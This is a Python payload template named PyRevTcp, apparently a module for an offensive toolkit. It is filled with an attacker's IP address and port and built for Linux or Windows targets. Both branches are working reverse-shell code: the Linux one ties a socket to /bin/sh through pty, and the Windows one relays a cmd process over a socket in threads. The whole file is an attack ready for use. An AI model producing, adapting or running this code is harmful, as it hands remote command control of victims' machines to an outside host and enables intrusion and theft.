#!name##PyRevTcp
#!itemType##payload
#!lang##python
#!info##Simple Reverse Shell built in python. Select the type of the target system.
#!itemTags##LW
#!Var##PRT_ip##$IP_ADDR##Host ip address##str
#!Var##PRT_port##4444##Host port number##str
#!Var##PRT_os##windows##Target operating system: 'linux' or 'windows'.##str
#!modProcess##BUILD_CODE


{% if PRT_os=="linux" %}
import os
import socket
import pty

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("{{PRT_ip}}", {{PRT_port}}))
os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)
pty.spawn("/bin/sh")
{%else%}
import subprocess
import socket
import os
import threading

def recive(conn, shell):
    while True:
        recv = conn.recv(1024)
        if recv:
            shell.stdin.write(recv)
            shell.stdin.flush()

def send_loop(conn, shell):
    while True:
        conn.send(shell.stdout.read(1))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("{{PRT_ip}}", {{PRT_port}}))

shell = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

send = threading.Thread(target=send_loop, args=(sock, shell), daemon=True)
send.start()

recv = threading.Thread(target=recive, args=(sock, shell), daemon=True)
recv.start()

try:
    shell.wait()
except KeyboardInterrupt:
    sock.close()
{%endif%}